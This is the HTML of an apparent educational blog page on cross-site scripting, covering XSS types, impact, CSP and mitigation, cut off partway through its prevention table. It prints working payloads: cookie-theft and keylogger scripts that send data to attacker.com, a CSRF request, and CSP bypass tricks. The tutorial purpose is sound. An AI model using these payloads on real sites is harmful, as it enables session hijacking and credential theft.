<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XSS Security Blog - Devil_XSS</title>
    <link rel="icon" type="image/x-icon" href="images/favicon.ico">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Pixelify+Sans:wght@400..700&family=Sixtyfour+Convergence&family=Tiny5&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="styles.css">
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        .blog-container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 100px 20px 50px;
        }
        .blog-header {
            text-align: center;
            margin-bottom: 60px;
            padding: 60px 40px;
            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a1a 50%, #2a2a2a 100%);
            border-radius: 25px;
            border: 3px solid var(--text-primary);
            position: relative;
            overflow: hidden;
        }
        .blog-header::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><defs><pattern id="grid" width="10" height="10" patternUnits="userSpaceOnUse"><path d="M 10 0 L 0 0 0 10" fill="none" stroke="%23333" stroke-width="0.5"/></pattern></defs><rect width="100" height="100" fill="url(%23grid)"/></svg>');
            opacity: 0.1;
            animation: gridMove 20s linear infinite;
        }
        .blog-logo {
            width: 150px;
            height: 150px;
            border-radius: 50%;
            margin: 0 auto 30px;
            display: block;
            filter: drop-shadow(0 0 30px rgba(255, 0, 0, 0.6));
            animation: logoGlow 2s ease-in-out infinite alternate;
            position: relative;
            z-index: 2;
        }
        .blog-title {
            font-size: 4rem;
            font-weight: 900;
            margin-bottom: 20px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            position: relative;
            z-index: 2;
        }
        .blog-subtitle {
            font-size: 1.4rem;
            color: var(--text-secondary);
            margin-bottom: 30px;
            position: relative;
            z-index: 2;
        }
        .content-section {
            margin-bottom: 60px;
            padding: 40px;
            background: var(--bg-card);
            border-radius: 20px;
            border: 2px solid var(--text-primary);
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
        }
        .section-title {
            font-size: 2.5rem;
            color: var(--accent-cyan);
            margin-bottom: 30px;
            display: flex;
            align-items: center;
            gap: 15px;
        }
        .section-title i {
            font-size: 2rem;
        }
        .subsection-title {
            font-size: 1.8rem;
            color: var(--accent-green);
            margin: 30px 0 20px;
            padding-left: 20px;
            border-left: 4px solid var(--accent-green);
        }
        .content-text {
            font-size: 1.1rem;
            line-height: 1.8;
            color: var(--text-secondary);
            margin-bottom: 20px;
        }
        .method-table {
            width: 100%;
            border-collapse: collapse;
            margin: 30px 0;
            background: var(--bg-primary);
            border-radius: 15px;
            overflow: hidden;
            border: 2px solid var(--text-primary);
        }
        .method-table th {
            background: var(--bg-secondary);
            color: var(--text-primary);
            padding: 20px;
            text-align: left;
            font-weight: 700;
            font-size: 1.1rem;
            border-bottom: 2px solid var(--text-primary);
        }
        .method-table td {
            padding: 20px;
            border-bottom: 1px solid var(--text-primary);
            color: var(--text-primary);
            vertical-align: top;
        }
        .method-table tr:hover {
            background: var(--bg-hover);
        }
        .code-example {
            background: var(--bg-tertiary);
            padding: 20px;
            border-radius: 10px;
            border-left: 4px solid var(--accent-green);
            margin: 20px 0;
            font-family: var(--font-secondary);
            overflow-x: auto;
        }
        .code-example code {
            color: var(--accent-green);
            font-size: 1rem;
        }
        .impact-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 20px;
            margin: 30px 0;
        }
        .impact-card {
            background: var(--bg-secondary);
            padding: 25px;
            border-radius: 15px;
            border: 2px solid var(--text-primary);
            text-align: center;
            transition: transform 0.3s ease;
        }
        .impact-card:hover {
            transform: translateY(-5px);
        }
        .impact-card h4 {
            color: var(--accent-red);
            margin-bottom: 15px;
            font-size: 1.3rem;
        }
        .impact-card p {
            color: var(--text-secondary);
            line-height: 1.6;
        }
        .back-to-home {
            position: fixed;
            top: 20px;
            left: 20px;
            background: var(--accent-purple);
            color: var(--text-primary);
            padding: 15px 25px;
            border-radius: 50px;
            text-decoration: none;
            font-weight: 600;
            transition: all 0.3s ease;
            z-index: 1000;
            border: 2px solid var(--text-primary);
        }
        .back-to-home:hover {
            background: var(--accent-blue);
            transform: scale(1.05);
        }
        
        /* Enhanced Responsive Design */
        .content-image {
            width: 100%;
            max-width: 600px;
            height: auto;
            border-radius: 15px;
            margin: 20px 0;
            border: 2px solid var(--text-primary);
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
            transition: transform 0.3s ease;
        }
        .content-image:hover {
            transform: scale(1.02);
        }
        .image-container {
            text-align: center;
            margin: 30px 0;
        }
        .image-caption {
            font-size: 0.9rem;
            color: var(--text-muted);
            margin-top: 10px;
            font-style: italic;
        }
        .info-box {
            background: var(--bg-secondary);
            border-left: 5px solid var(--accent-cyan);
            padding: 25px;
            margin: 25px 0;
            border-radius: 10px;
            border: 1px solid var(--text-primary);
        }
        .warning-box {
            background: var(--bg-secondary);
            border-left: 5px solid var(--accent-red);
            padding: 25px;
            margin: 25px 0;
            border-radius: 10px;
            border: 1px solid var(--accent-red);
        }
        .success-box {
            background: var(--bg-secondary);
            border-left: 5px solid var(--accent-green);
            padding: 25px;
            margin: 25px 0;
            border-radius: 10px;
            border: 1px solid var(--accent-green);
        }
        .feature-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 25px;
            margin: 30px 0;
        }
        .feature-card {
            background: var(--bg-secondary);
            padding: 30px;
            border-radius: 15px;
            border: 2px solid var(--text-primary);
            text-align: center;
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
        }
        .feature-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 4px;
            background: linear-gradient(90deg, var(--accent-cyan), var(--accent-green));
        }
        .feature-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.4);
        }
        .feature-icon {
            font-size: 3rem;
            color: var(--accent-cyan);
            margin-bottom: 20px;
        }
        .feature-card h4 {
            color: var(--text-primary);
            margin-bottom: 15px;
            font-size: 1.4rem;
        }
        .feature-card p {
            color: var(--text-secondary);
            line-height: 1.6;
        }
        
        /* Mobile Responsive Design */
        @media (max-width: 1200px) {
            .blog-container {
                padding: 80px 15px 40px;
            }
            .content-section {
                padding: 30px;
            }
            .method-table {
                font-size: 0.9rem;
            }
            .method-table th,
            .method-table td {
                padding: 15px;
            }
        }
        
        @media (max-width: 768px) {
            .blog-container {
                padding: 70px 10px 30px;
            }
            .blog-header {
                padding: 40px 20px;
                margin-bottom: 40px;
            }
            .blog-logo {
                width: 120px;
                height: 120px;
            }
            .blog-title {
                font-size: 2.5rem;
            }
            .blog-subtitle {
                font-size: 1.1rem;
            }
            .content-section {
                padding: 20px;
                margin-bottom: 40px;
            }
            .section-title {
                font-size: 2rem;
                flex-direction: column;
                text-align: center;
                gap: 10px;
            }
            .subsection-title {
                font-size: 1.4rem;
                padding-left: 15px;
            }
            .method-table {
                font-size: 0.8rem;
                overflow-x: auto;
                display: block;
                white-space: nowrap;
            }
            .method-table th,
            .method-table td {
                padding: 10px;
                min-width: 150px;
            }
            .impact-grid {
                grid-template-columns: 1fr;
                gap: 15px;
            }
            .feature-grid {
                grid-template-columns: 1fr;
                gap: 20px;
            }
            .back-to-home {
                position: fixed;
                top: 10px;
                left: 10px;
                padding: 10px 15px;
                font-size: 0.9rem;
            }
            .toc {
                padding: 20px;
            }
            .code-example {
                padding: 15px;
                font-size: 0.9rem;
            }
        }
        
        @media (max-width: 480px) {
            .blog-container {
                padding: 60px 5px 20px;
            }
            .blog-header {
                padding: 30px 15px;
            }
            .blog-logo {
                width: 100px;
                height: 100px;
            }
            .blog-title {
                font-size: 2rem;
            }
            .blog-subtitle {
                font-size: 1rem;
            }
            .content-section {
                padding: 15px;
            }
            .section-title {
                font-size: 1.6rem;
            }
            .subsection-title {
                font-size: 1.2rem;
            }
            .method-table {
                font-size: 0.7rem;
            }
            .method-table th,
            .method-table td {
                padding: 8px;
                min-width: 120px;
            }
            .content-text {
                font-size: 1rem;
            }
            .code-example {
                padding: 10px;
                font-size: 0.8rem;
            }
            .back-to-home {
                padding: 8px 12px;
                font-size: 0.8rem;
            }
        }
        
        /* Touch-friendly interactions */
        @media (hover: none) and (pointer: coarse) {
            .feature-card:hover {
                transform: none;
            }
            .content-image:hover {
                transform: none;
            }
            .back-to-home:hover {
                transform: none;
            }
        }
        
        /* Print styles */
        @media print {
            .back-to-home {
                display: none;
            }
            .blog-header {
                background: white;
                color: black;
            }
            .content-section {
                background: white;
                border: 1px solid black;
            }
            .method-table {
                border: 1px solid black;
            }
        }
        .toc {
            background: var(--bg-secondary);
            padding: 30px;
            border-radius: 15px;
            margin-bottom: 40px;
            border: 2px solid var(--text-primary);
        }
        .toc h3 {
            color: var(--accent-cyan);
            margin-bottom: 20px;
        }
        .toc ul {
            list-style: none;
            padding: 0;
        }
        .toc li {
            margin: 10px 0;
        }
        .toc a {
            color: var(--text-secondary);
            text-decoration: none;
            padding: 8px 15px;
            display: block;
            border-radius: 8px;
            transition: all 0.3s ease;
        }
        .toc a:hover {
            background: var(--bg-hover);
            color: var(--accent-cyan);
        }
    </style>
</head>
<body>
    <a href="index.html" class="back-to-home">
        <i class="fas fa-arrow-left"></i> Back to Home
    </a>

    <div class="blog-container">
        <!-- Blog Header -->
        <div class="blog-header">
            <img src="images/logo.png" alt="Devil_XSS Logo" class="blog-logo">
            <h1 class="blog-title pixelify-sans-bold">XSS Security Blog</h1>
            <p class="blog-subtitle">Comprehensive Guide to Cross-Site Scripting Vulnerabilities</p>
        </div>

        <!-- Table of Contents -->
        <div class="toc">
            <h3><i class="fas fa-list"></i> Table of Contents</h3>
            <ul>
                <li><a href="#what-is-xss">What is XSS?</a></li>
                <li><a href="#how-xss-works">How does XSS work?</a></li>
                <li><a href="#impact">Impact of an attack</a></li>
                <li><a href="#reflected-xss">Reflected XSS</a></li>
                <li><a href="#stored-xss">Stored XSS</a></li>
                <li><a href="#dom-based-xss">DOM-based XSS</a></li>
                <li><a href="#exploiting-xss">Exploiting XSS vulnerabilities</a></li>
                <li><a href="#csp">Content Security Policy (CSP)</a></li>
                <li><a href="#mitigation">Mitigating XSS attacks</a></li>
                <li><a href="#prevention">Preventing XSS attacks</a></li>
            </ul>
        </div>

        <!-- What is XSS? -->
        <div id="what-is-xss" class="content-section">
            <h2 class="section-title">
                <i class="fas fa-question-circle"></i>
                What is XSS?
            </h2>
            
            <div class="image-container">
                <img src="images/xss-attack.png" alt="XSS Attack Flow" class="content-image">
                <p class="image-caption">Cross-Site Scripting (XSS) Attack Flow Diagram</p>
            </div>
            
            <p class="content-text">
                Cross-Site Scripting (XSS) is one of the most prevalent and dangerous security vulnerabilities in web applications today. It occurs when a web application allows user-supplied data to be executed as code in the browser without proper validation or encoding. This vulnerability enables attackers to inject malicious scripts into web pages that are then executed by other users' browsers.
            </p>
            
            <p class="content-text">
                The term "Cross-Site Scripting" might seem confusing at first, as it doesn't necessarily involve cross-site attacks. The name originated because the vulnerability was initially discovered when malicious scripts could be executed across different websites. However, modern XSS attacks can occur within the same domain and are often more sophisticated than the original attacks.
            </p>
            
            <div class="info-box">
                <h4><i class="fas fa-info-circle"></i> Key Characteristics of XSS</h4>
                <ul>
                    <li><strong>Client-side execution:</strong> Malicious code runs in the victim's browser</li>
                    <li><strong>Context-dependent:</strong> The attack's success depends on how the application handles user input</li>
                    <li><strong>Privilege escalation:</strong> Scripts execute with the same privileges as the victim</li>
                    <li><strong>Persistence varies:</strong> Some XSS attacks are temporary, others are permanent</li>
                </ul>
            </div>
            
            <div class="impact-grid">
                <div class="impact-card">
                    <h4><i class="fas fa-shield-alt"></i> Security Risk</h4>
                    <p>XSS vulnerabilities can lead to complete account takeover, data theft, and unauthorized actions. Attackers can steal session cookies, authentication tokens, and sensitive user data.</p>
                </div>
                <div class="impact-card">
                    <h4><i class="fas fa-users"></i> User Impact</h4>
                    <p>Affects all users who visit the compromised page, potentially exposing their personal data, financial information, and private communications.</p>
                </div>
                <div class="impact-card">
                    <h4><i class="fas fa-globe"></i> Web Application</h4>
                    <p>Most common vulnerability in web applications, affecting millions of websites worldwide. OWASP consistently ranks XSS in the top 10 web vulnerabilities.</p>
                </div>
            </div>
            
            <div class="warning-box">
                <h4><i class="fas fa-exclamation-triangle"></i> Real-World Impact</h4>
                <p>XSS attacks have been responsible for major security breaches, including the theft of millions of user credentials, defacement of government websites, and the spread of malware. The impact can range from minor annoyances to complete system compromise.</p>
            </div>
        </div>

        <!-- How does XSS work? -->
        <div id="how-xss-works" class="content-section">
            <h2 class="section-title">
                <i class="fas fa-cogs"></i>
                How does XSS work?
            </h2>
            
            <div class="image-container">
                <img src="https://miro.medium.com/1*xfi1xm-5tsGmxhLF-Z5scQ.jpeg" alt="XSS Attack Process" class="content-image">
                <p class="image-caption">Detailed XSS Attack Process Flow</p>
            </div>
            
            <p class="content-text">
                XSS attacks exploit the fundamental trust relationship between a user's browser and a web application. The attack works by manipulating the application to include malicious code that gets executed in the victim's browser context, often with the same privileges as the legitimate user.
            </p>
            
            <p class="content-text">
                The core issue lies in how web applications handle user input. When an application takes user-supplied data and includes it in the HTML output without proper sanitization, it creates an opportunity for attackers to inject executable code. This happens because browsers cannot distinguish between legitimate application code and malicious injected code.
            </p>
            
            <div class="info-box">
                <h4><i class="fas fa-lightbulb"></i> Why XSS Works</h4>
                <p>XSS vulnerabilities exist because web applications often need to display user-generated content. The challenge is ensuring that this content is treated as data rather than executable code. When applications fail to properly encode or validate user input, they create opportunities for code injection.</p>
            </div>
            
            <h3 class="subsection-title">Detailed Attack Process</h3>
            <table class="method-table">
                <thead>
                    <tr>
                        <th>Step</th>
                        <th>Description</th>
                        <th>Technical Details</th>
                        <th>Example</th>
                    </tr>
                </thead>
                <tbody>
                    <tr>
                        <td>1. Reconnaissance</td>
                        <td>Identify input fields and parameters that reflect user data</td>
                        <td>Analyze HTTP requests, form fields, URL parameters, headers</td>
                        <td>Search functionality, comment systems, user profiles</td>
                    </tr>
                    <tr>
                        <td>2. Vulnerability Assessment</td>
                        <td>Test if input is properly sanitized before output</td>
                        <td>Submit test payloads and analyze server responses</td>
                        <td>Input: &lt;script&gt;alert('test')&lt;/script&gt;</td>
                    </tr>
                    <tr>
                        <td>3. Payload Crafting</td>
                        <td>Create malicious JavaScript code for specific attack goals</td>
                        <td>Consider context, filters, and target functionality</td>
                        <td>Cookie theft, keylogging, CSRF, defacement</td>
                    </tr>
                    <tr>
                        <td>4. Payload Injection</td>
                        <td>Submit malicious code through vulnerable input vector</td>
                        <td>Use appropriate encoding and filter bypass techniques</td>
                        <td>URL encoding, HTML entities, Unicode escapes</td>
                    </tr>
                    <tr>
                        <td>5. Server Processing</td>
                        <td>Application processes and stores/reflects the payload</td>
                        <td>Server-side validation, database storage, response generation</td>
                        <td>Stored in database or reflected in response</td>
                    </tr>
                    <tr>
                        <td>6. Victim Access</td>
                        <td>Victim visits page containing the malicious code</td>
                        <td>Browser loads page and encounters malicious script</td>
                        <td>User clicks link or visits compromised page</td>
                    </tr>
                    <tr>
                        <td>7. Code Execution</td>
                        <td>Browser executes malicious code in victim's context</td>
                        <td>JavaScript engine processes and runs the injected code</td>
                        <td>Script runs with victim's session privileges</td>
                    </tr>
                </tbody>
            </table>
            
            <div class="feature-grid">
                <div class="feature-card">
                    <div class="feature-icon"><i class="fas fa-search"></i></div>
                    <h4>Reconnaissance Phase</h4>
                    <p>Attackers first identify potential injection points by analyzing the application's input handling mechanisms and testing various parameters.</p>
                </div>
                <div class="feature-card">
                    <div class="feature-icon"><i class="fas fa-code"></i></div>
                    <h4>Payload Development</h4>
                    <p>Malicious scripts are crafted based on the target context, considering filter bypass techniques and specific attack objectives.</p>
                </div>
                <div class="feature-card">
                    <div class="feature-icon"><i class="fas fa-rocket"></i></div>
                    <h4>Execution Phase</h4>
                    <p>Once injected, the malicious code executes in the victim's browser with the same privileges as the legitimate user.</p>
                </div>
            </div>
            
            <div class="warning-box">
                <h4><i class="fas fa-exclamation-triangle"></i> Critical Points</h4>
                <p>XSS attacks are particularly dangerous because they execute in the user's browser context, meaning they can access all data available to that user, including session cookies, local storage, and other sensitive information. The attack appears to come from the trusted website, making it difficult for users to detect.</p>
            </div>
        </div>

        <!-- Impact of an attack -->
        <div id="impact" class="content-section">
            <h2 class="section-title">
                <i class="fas fa-exclamation-triangle"></i>
                Impact of an attack
            </h2>
            
            <div class="image-container">
                <img src="https://www.inspectiv.com/hs-fs/hubfs/Inspectiv_December2022/images/61cccea239d4b277ca3ded61_Screen-Shot-2021-05-19-at-8.26.31-AM-1024x364.png?width=1536&height=546&name=61cccea239d4b277ca3ded61_Screen-Shot-2021-05-19-at-8.26.31-AM-1024x364.png" alt="XSS Attack Impact" class="content-image">
                <p class="image-caption">Comprehensive XSS Attack Impact Assessment</p>
            </div>
            
            <p class="content-text">
                The impact of XSS attacks can be devastating, ranging from minor annoyances to complete system compromise. The severity depends on several factors including the type of XSS vulnerability, the privileges of the affected user, the sensitivity of the data involved, and the attacker's objectives.
            </p>
            
            <p class="content-text">
                XSS attacks are particularly dangerous because they execute in the user's browser context, meaning they can access all data available to that user session. This includes session cookies, local storage, form data, and any other information the user can see or interact with on the compromised page.
            </p>
            
            <h3 class="subsection-title">Data Theft and Information Disclosure</h3>
            <p class="content-text">
                One of the most common and dangerous impacts of XSS attacks is the theft of sensitive information. Attackers can steal a wide range of data including session cookies, authentication tokens, personal information, financial data, and confidential business information.
            </p>
            
            <div class="feature-grid">
                <div class="feature-card">
                    <div class="feature-icon"><i class="fas fa-cookie-bite"></i></div>
                    <h4>Session Cookies</h4>
                    <p>Steal authentication cookies to impersonate users and gain unauthorized access to their accounts.</p>
                </div>
                <div class="feature-card">
                    <div class="feature-icon"><i class="fas fa-id-card"></i></div>
                    <h4>Personal Data</h4>
                    <p>Access user profiles, contact information, and other personal details displayed on the page.</p>
                </div>
                <div class="feature-card">
                    <div class="feature-icon"><i class="fas fa-credit-card"></i></div>
                    <h4>Financial Information</h4>
                    <p>Steal credit card numbers, bank account details, and other financial data from forms or displays.</p>
                </div>
            </div>
            
            <h3 class="subsection-title">Session Hijacking and Account Takeover</h3>
            <p class="content-text">
                Session hijacking occurs when attackers steal session cookies or tokens and use them to impersonate legitimate users. This can lead to complete account takeover, allowing attackers to perform any action the victim could perform.
            </p>
            
            <div class="code-example">
                <code>
                    // Example: Session hijacking via XSS
                    &lt;script&gt;
                        // Steal session cookie
                        var sessionCookie = document.cookie;
                        
                        // Send to attacker's server
                        fetch('http://attacker.com/steal', {
                            method: 'POST',
                            body: 'session=' + sessionCookie
                        });
                    &lt;/script&gt;
                </code>
            </div>
            
            <h3 class="subsection-title">Website Defacement and Content Manipulation</h3>
            <p class="content-text">
                XSS attacks can be used to modify web page content, redirect users to malicious sites, or completely deface websites. This can damage the organization's reputation and spread malware to visitors.
            </p>
            
            <div class="warning-box">
                <h4><i class="fas fa-skull-crossbones"></i> Advanced Attack Techniques</h4>
                <p>Sophisticated attackers can use XSS to install persistent malware, create backdoors, or establish command and control channels. These attacks can persist even after the initial XSS vulnerability is patched.</p>
            </div>
            
            <h3 class="subsection-title">Keylogger Installation and Credential Harvesting</h3>
            <p class="content-text">
                XSS can be used to install keyloggers that capture user keystrokes, including passwords, credit card numbers, and other sensitive input. This data can be sent to attacker-controlled servers for later use.
            </p>
            
            <div class="code-example">
                <code>
                    // Example: Keylogger via XSS
                    &lt;script&gt;
                        var keystrokes = '';
                        document.addEventListener('keypress', function(e) {
                            keystrokes += e.key;
                            
                            // Send keystrokes every 10 characters
                            if (keystrokes.length >= 10) {
                                fetch('http://attacker.com/log', {
                                    method: 'POST',
                                    body: 'keys=' + keystrokes
                                });
                                keystrokes = '';
                            }
                        });
                    &lt;/script&gt;
                </code>
            </div>
            
            <h3 class="subsection-title">Cross-Site Request Forgery (CSRF) Attacks</h3>
            <p class="content-text">
                XSS can be used to perform CSRF attacks by making unauthorized requests on behalf of the victim. This can include changing passwords, transferring funds, or modifying account settings.
            </p>
            
            <div class="success-box">
                <h4><i class="fas fa-shield-alt"></i> Mitigation Priority</h4>
                <p>Given the severe impact of XSS attacks, they should be treated as high-priority vulnerabilities. Organizations should implement comprehensive input validation, output encoding, and Content Security Policy (CSP) to prevent these attacks.</p>
            </div>
            
            <table class="method-table">
                <thead>
                    <tr>
                        <th>Impact Type</th>
                        <th>Severity</th>
                        <th>Business Impact</th>
                        <th>User Impact</th>
                    </tr>
                </thead>
                <tbody>
                    <tr>
                        <td>Data Theft</td>
                        <td>Critical</td>
                        <td>Regulatory fines, reputation damage</td>
                        <td>Identity theft, financial loss</td>
                    </tr>
                    <tr>
                        <td>Account Takeover</td>
                        <td>Critical</td>
                        <td>Unauthorized access to systems</td>
                        <td>Loss of account control</td>
                    </tr>
                    <tr>
                        <td>Website Defacement</td>
                        <td>High</td>
                        <td>Reputation damage, downtime</td>
                        <td>Confusion, potential malware</td>
                    </tr>
                    <tr>
                        <td>Malware Distribution</td>
                        <td>Critical</td>
                        <td>Infected user systems</td>
                        <td>System compromise, data loss</td>
                    </tr>
                </tbody>
            </table>
        </div>

        <!-- Reflected XSS -->
        <div id="reflected-xss" class="content-section">
            <h2 class="section-title">
                <i class="fas fa-arrow-right"></i>
                Reflected XSS
            </h2>
            <p class="content-text">
                Reflected XSS occurs when malicious script is reflected off a web server in a response. The attack is non-persistent and requires the victim to click a malicious link.
            </p>
            
            <h3 class="subsection-title">How Reflected XSS Works</h3>
            <div class="code-example">
                <code>
                    // Vulnerable URL
                    https://example.com/search?q=&lt;script&gt;alert('XSS')&lt;/script&gt;
                    
                    // Server response includes the script
                    &lt;h1&gt;Search results for: &lt;script&gt;alert('XSS')&lt;/script&gt;&lt;/h1&gt;
                </code>
            </div>
            
            <h3 class="subsection-title">Testing Methods</h3>
            <table class="method-table">
                <thead>
                    <tr>
                        <th>Method</th>
                        <th>Description</th>
                        <th>Payload Example</th>
                    </tr>
                </thead>
                <tbody>
                    <tr>
                        <td>Basic Script Injection</td>
                        <td>Test with simple script tags</td>
                        <td>&lt;script&gt;alert('XSS')&lt;/script&gt;</td>
                    </tr>
                    <tr>
                        <td>Event Handler Injection</td>
                        <td>Use HTML event handlers</td>
                        <td>&lt;img src=x onerror=alert('XSS')&gt;</td>
                    </tr>
                    <tr>
                        <td>JavaScript URI</td>
                        <td>Use javascript: protocol</td>
                        <td>javascript:alert('XSS')</td>
                    </tr>
                    <tr>
                        <td>Filter Bypass</td>
                        <td>Bypass common filters</td>
                        <td>&lt;ScRiPt&gt;alert('XSS')&lt;/ScRiPt&gt;</td>
                    </tr>
                </tbody>
            </table>
        </div>

        <!-- Stored XSS -->
        <div id="stored-xss" class="content-section">
            <h2 class="section-title">
                <i class="fas fa-database"></i>
                Stored XSS
            </h2>
            <p class="content-text">
                Stored XSS (also known as Persistent XSS) occurs when malicious script is stored on the target server and executed whenever a user visits the affected page.
            </p>
            
            <h3 class="subsection-title">Common Attack Vectors</h3>
            <table class="method-table">
                <thead>
                    <tr>
                        <th>Vector</th>
                        <th>Description</th>
                        <th>Risk Level</th>
                    </tr>
                </thead>
                <tbody>
                    <tr>
                        <td>Comment Systems</td>
                        <td>Malicious scripts in user comments</td>
                        <td>High</td>
                    </tr>
                    <tr>
                        <td>User Profiles</td>
                        <td>Scripts in profile descriptions or bios</td>
                        <td>High</td>
                    </tr>
                    <tr>
                        <td>Forums</td>
                        <td>Malicious posts in discussion forums</td>
                        <td>Medium</td>
                    </tr>
                    <tr>
                        <td>Admin Panels</td>
                        <td>Scripts in admin-accessible fields</td>
                        <td>Critical</td>
                    </tr>
                </tbody>
            </table>
            
            <h3 class="subsection-title">Testing for Vulnerabilities</h3>
            <div class="code-example">
                <code>
                    // Test payload for stored XSS
                    &lt;script&gt;
                        // Steal cookies
                        document.location='http://attacker.com/steal.php?cookie='+document.cookie;
                    &lt;/script&gt;
                    
                    // Alternative payload
                    &lt;img src=x onerror="fetch('http://attacker.com/log',{method:'POST',body:document.cookie})"&gt;
                </code>
            </div>
        </div>

        <!-- DOM-based XSS -->
        <div id="dom-based-xss" class="content-section">
            <h2 class="section-title">
                <i class="fas fa-code-branch"></i>
                DOM-based XSS
            </h2>
            <p class="content-text">
                DOM-based XSS occurs when the vulnerability exists in client-side code rather than server-side code. The attack is executed by modifying the DOM environment in the victim's browser.
            </p>
            
            <h3 class="subsection-title">Common DOM XSS Sources</h3>
            <table class="method-table">
                <thead>
                    <tr>
                        <th>Source</th>
                        <th>Description</th>
                        <th>Example</th>
                    </tr>
                </thead>
                <tbody>
                    <tr>
                        <td>document.URL</td>
                        <td>Current page URL</td>
                        <td>window.location.href</td>
                    </tr>
                    <tr>
                        <td>document.referrer</td>
                        <td>Referring page URL</td>
                        <td>document.referrer</td>
                    </tr>
                    <tr>
                        <td>location.search</td>
                        <td>URL query parameters</td>
                        <td>location.search</td>
                    </tr>
                    <tr>
                        <td>localStorage</td>
                        <td>Browser local storage</td>
                        <td>localStorage.getItem('key')</td>
                    </tr>
                </tbody>
            </table>
            
            <h3 class="subsection-title">Testing DOM XSS</h3>
            <div class="code-example">
                <code>
                    // Vulnerable code example
                    document.getElementById('content').innerHTML = userInput;
                    
                    // Test payload
                    #&lt;script&gt;alert('DOM XSS')&lt;/script&gt;
                    
                    // Another test
                    #&lt;img src=x onerror=alert('XSS')&gt;
                </code>
            </div>
        </div>

        <!-- Exploiting XSS -->
        <div id="exploiting-xss" class="content-section">
            <h2 class="section-title">
                <i class="fas fa-bug"></i>
                Exploiting XSS vulnerabilities
            </h2>
            
            <h3 class="subsection-title">Cookie Theft</h3>
            <div class="code-example">
                <code>
                    // Basic cookie theft
                    &lt;script&gt;
                        document.location='http://attacker.com/steal.php?cookie='+document.cookie;
                    &lt;/script&gt;
                    
                    // Stealthy cookie theft
                    &lt;script&gt;
                        new Image().src='http://attacker.com/steal.php?cookie='+document.cookie;
                    &lt;/script&gt;
                </code>
            </div>
            
            <h3 class="subsection-title">Password Capture</h3>
            <div class="code-example">
                <code>
                    // Keylogger for password capture
                    &lt;script&gt;
                        document.addEventListener('keypress', function(e) {
                            fetch('http://attacker.com/log', {
                                method: 'POST',
                                body: 'key=' + e.key
                            });
                        });
                    &lt;/script&gt;
                </code>
            </div>
            
            <h3 class="subsection-title">CSRF Attack</h3>
            <div class="code-example">
                <code>
                    // CSRF via XSS
                    &lt;script&gt;
                        fetch('/admin/delete-user', {
                            method: 'POST',
                            body: 'userId=123',
                            credentials: 'include'
                        });
                    &lt;/script&gt;
                </code>
            </div>
        </div>

        <!-- Content Security Policy -->
        <div id="csp" class="content-section">
            <h2 class="section-title">
                <i class="fas fa-shield-alt"></i>
                Content Security Policy (CSP)
            </h2>
            <p class="content-text">
                CSP is a security feature that helps prevent XSS attacks by specifying which resources the browser is allowed to load and execute.
            </p>
            
            <h3 class="subsection-title">CSP Directives</h3>
            <table class="method-table">
                <thead>
                    <tr>
                        <th>Directive</th>
                        <th>Purpose</th>
                        <th>Example</th>
                    </tr>
                </thead>
                <tbody>
                    <tr>
                        <td>script-src</td>
                        <td>Controls script execution</td>
                        <td>script-src 'self' 'unsafe-inline'</td>
                    </tr>
                    <tr>
                        <td>style-src</td>
                        <td>Controls stylesheet loading</td>
                        <td>style-src 'self' fonts.googleapis.com</td>
                    </tr>
                    <tr>
                        <td>img-src</td>
                        <td>Controls image loading</td>
                        <td>img-src 'self' data: https:</td>
                    </tr>
                    <tr>
                        <td>connect-src</td>
                        <td>Controls AJAX/fetch requests</td>
                        <td>connect-src 'self' api.example.com</td>
                    </tr>
                </tbody>
            </table>
            
            <h3 class="subsection-title">Bypassing CSP</h3>
            <div class="code-example">
                <code>
                    // CSP bypass techniques
                    // 1. JSONP endpoints
                    &lt;script src="/api/user?callback=alert"&gt;&lt;/script&gt;
                    
                    // 2. Base64 encoding
                    &lt;script&gt;eval(atob('YWxlcnQoJ1hTUycp'))&lt;/script&gt;
                    
                    // 3. Data URI
                    &lt;script src="data:text/javascript,alert('XSS')"&gt;&lt;/script&gt;
                </code>
            </div>
        </div>

        <!-- Mitigation -->
        <div id="mitigation" class="content-section">
            <h2 class="section-title">
                <i class="fas fa-tools"></i>
                Mitigating XSS attacks
            </h2>
            
            <h3 class="subsection-title">Input Validation</h3>
            <p class="content-text">
                Validate and sanitize all user inputs on both client and server side. Use whitelist validation whenever possible.
            </p>
            
            <h3 class="subsection-title">Output Encoding</h3>
            <p class="content-text">
                Encode all user-controlled data before displaying it in HTML, JavaScript, CSS, or URL contexts.
            </p>
            
            <h3 class="subsection-title">Content Security Policy</h3>
            <p class="content-text">
                Implement a strict CSP to prevent unauthorized script execution and limit the sources of executable content.
            </p>
            
            <h3 class="subsection-title">HttpOnly Cookies</h3>
            <p class="content-text">
                Use HttpOnly flag on cookies to prevent JavaScript access, reducing the impact of XSS attacks.
            </p>
        </div>

        <!-- Prevention -->
        <div id="prevention" class="content-section">
            <h2 class="section-title">
                <i class="fas fa-lock"></i>
                Preventing XSS attacks
            </h2>
            
            <h3 class="subsection-title">Best Practices</h3>
            <table class="method-table">
                <thead>
                    <tr>
